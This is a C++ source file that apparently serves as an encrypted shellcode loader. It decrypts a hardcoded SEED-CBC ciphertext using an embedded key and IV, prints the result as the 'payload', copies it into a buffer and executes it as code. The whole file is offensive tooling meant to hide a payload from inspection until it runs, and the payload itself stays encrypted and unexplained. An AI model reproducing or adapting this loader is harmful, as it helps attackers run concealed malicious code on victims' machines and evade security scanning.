
//////////////////INCLUDE LIBRARY//////////////////////////
#include "iostream"
#include <fstream>
#include "cryptopp/seed.h"
#include "cryptopp/hex.h"
#include "cryptopp/modes.h"
#include "cryptopp/osrng.h"
#include "cryptopp/base64.h"
///////////////////END OF INCLUDE LIBRARY////////////////////////////

using namespace std;
using namespace CryptoPP;

string decode(string data)
{
   std::string decoded;
   StringSource(data, true,
      new HexDecoder(
         new StringSink(decoded)
      ) // HexEncoder
   ); // StringSource

	return decoded;
}

int main()
{
   AutoSeededRandomPool prng;
   std::string keys=decode("EF2DD0C299D3819D7E2A618E6950B8E8");
   std::string IVs=decode("091FB02FB1AD3E6BA7F2A77760FCCD49");

   SecByteBlock key((const byte*)keys.data(), keys.size());
   SecByteBlock iv((const byte*)IVs.data(), IVs.size());


string cipher="553084C52FF78E23BE31A30FEFA67D289BE5DACFE71FEAFF7D4EFA301400B909ADEA34EC47814E3693265299310BCC3528ED0E0F57D681B141035D91F02DC024C0064C54BDF29DA9E9BFE18A2A2F585780DED0A2F0638CDC0C039A472FA0A80BA3254A45ACAED60F730F6460004A253EDD3509BC48714EDEE1D79C4A58CE34A94FD026C8C7F12247FC7246B0D36533C1F91123EAB1B27C7987DC60FA9F2E03A34DB72D8EF0F17F646BCA7E5688C7E5A4F943B829F687511D3793F2AB116A5C67737FBF5F673D444E67F43ED56DEDD660A1979BFC1CEB95D4FEC0E2D4D2A873F3A51DA402DE06FF02CBD7B44362EFC8FA4ED91DA8D91FBBB0782B2D2FCC2CFE563182F7AB7A54FBBCD2F9560EC03BDC79505095335D736DDD31D707C23B4EC8AA882B1F9777A187792816EC95F423281A674858F6FABE19B962F933757A0B5548";
   std::string encoded, recovered;

   try
   {
      CBC_Mode< SEED >::Decryption d;
      d.SetKeyWithIV(key, key.size(), iv);

      // The StreamTransformationFilter removes
      //  padding as required.
      StringSource s(cipher, true,(new HexDecoder( 
       new StreamTransformationFilter(d,
		new StringSink(recovered)))
       ) // StreamTransformationFilter
      ); // StringSource

      std::cout << "Payload is : " << recovered << std::endl;
   }
   catch(const CryptoPP::Exception& e)
   {
      std::cerr << e.what() << std::endl;
      exit(1);
   }

// Convert the decoded data to a char

	char * writable = new char[recovered.size()];
	std::copy(recovered.begin(), recovered.end(), writable);

// Execute the shellcode
   	int (*ret)() = (int(*)())writable;
	ret();

return 0;   
}
